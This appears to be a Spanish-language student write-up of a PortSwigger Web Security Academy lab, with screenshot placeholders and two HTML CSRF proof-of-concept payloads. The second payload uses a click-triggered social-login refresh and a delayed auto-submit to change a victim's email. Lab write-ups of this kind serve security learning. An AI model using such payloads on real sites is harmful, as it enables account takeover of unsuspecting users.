
![[Pasted image 20230704201219.png]]

me logeo, actualizo correo y voy a Home

![[Pasted image 20230704201319.png]]

![[Pasted image 20230704201417.png]]

![[Pasted image 20230704201446.png]]

![[Pasted image 20230704201517.png]]

![[Pasted image 20230704201551.png]]

el endpoint change-email lo mando al repeater:

![[Pasted image 20230704201711.png]]

en el repeater uso la secuecia Engagement Tools -> Generate CSRF Attack

![[Pasted image 20230704201905.png]]

copio el payload tal y como esta para llevarlo al exploit server:

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a5800650329170783f4069500ba00f3.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hackme&#64;myhacking&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

![[Pasted image 20230704202059.png]]

hago un cambio en el correo para verificar operacion:

![[Pasted image 20230704202148.png]]

agrego estos elementos al payload:

script
	window.onclick = () =>  {
		window.open('https://YOURLABID.net/social-login');
		setTimeout(changeEmail, 5000);
	}
![[Pasted image 20230704202527.png]]


actualizo el link del lab y agrego una linea abajo:

![[Pasted image 20230704202732.png]]

le doy store y deploy para verificar el cambio:

![[Pasted image 20230704203421.png]]

aca no cambio entonces vamos a agregarle al payload estas lineas:

![[Pasted image 20230704203608.png]]

este es el payload completo:

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a5800650329170783f4069500ba00f3.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hackme01&#64;myhacking&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
         window.onclick = () =>  {
		window.open('https://0a5800650329170783f4069500ba00f3.web-security-academy.net/social-login');
		setTimeout(changeEmail, 5000);
	}

       function changeEmail() {
                document.forms[0].submit();
       }
    </script>
  </body>
</html>


damos Store y Deploy to the victim y espero un minuto aprox:

![[Pasted image 20230704203751.png]]


